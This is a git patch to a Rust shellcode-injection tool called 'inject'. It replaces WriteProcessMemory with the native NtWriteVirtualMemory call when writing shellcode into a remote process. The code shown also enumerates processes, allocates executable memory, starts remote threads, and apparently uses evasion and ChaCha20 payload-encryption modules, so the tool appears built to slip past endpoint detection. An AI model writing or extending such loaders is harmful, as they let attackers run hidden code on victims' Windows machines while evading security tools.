@@ -1,0 +1,67 @@
+From dc424ffeb5280db8f8b98cee4a528d04cbf3c032 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Tue, 20 Oct 2026 17:34:31 +0700
+Subject: [PATCH 03/10] convert WriteProcessMemory to NtWriteVirtualMemory
+
+---
+ inject/Cargo.toml  |  1 +
+ inject/src/main.rs | 14 ++++++++------
+ 2 files changed, 9 insertions(+), 6 deletions(-)
+
+diff --git a/inject/Cargo.toml b/inject/Cargo.toml
+index ab0294b..76dd9bf 100644
+--- a/inject/Cargo.toml
++++ b/inject/Cargo.toml
+@@ -13,6 +13,7 @@ num_cpus = "1.15"
+ sysinfo = "0.29"
+ chacha20poly1305 = "0.10.1"
+ base64 = "0.22.1"
++ntapi = "0.4.1"
+ 
+ [build-dependencies]
+ chacha20poly1305 = "0.10.1"
+diff --git a/inject/src/main.rs b/inject/src/main.rs
+index 578e29a..df7a4ad 100644
+--- a/inject/src/main.rs
++++ b/inject/src/main.rs
+@@ -2,10 +2,12 @@ use std::{ptr::null_mut, mem::size_of, process};
+ use clap::Parser;
+ mod evasion;
+ mod crypto;
++use ntapi::ntmmapi::NtWriteVirtualMemory;
++use ntapi::winapi::shared::ntdef::NT_SUCCESS;
+ use windows_sys::Win32::{
+     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
+     System::{
+-        Diagnostics::{Debug::WriteProcessMemory, ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}},
++        Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next},
+         Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
+         Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
+     },
+@@ -68,9 +70,9 @@ fn main() {
+     }
+ 
+     // Write the shellcode to the target process
+-    let wpm_result = unsafe {
+-        WriteProcessMemory(
+-            process_handle,
++    let status = unsafe {
++        NtWriteVirtualMemory(
++            process_handle as _,
+             shellcode_address as _,
+             shellcode_bytes.as_ptr() as _,
+             shellcode_bytes.len(),
+@@ -78,8 +80,8 @@ fn main() {
+         )
+     };
+ 
+-    if wpm_result == 0 {
+-        panic!("Failed to write the image to the target process");
++    if !NT_SUCCESS(status) {
++        panic!("Failed to write the image to the target process. Status: {:#X}", status);
+     }
+ 
+     //For debugging
+-- 
+2.39.5 (Apple Git-154)
+
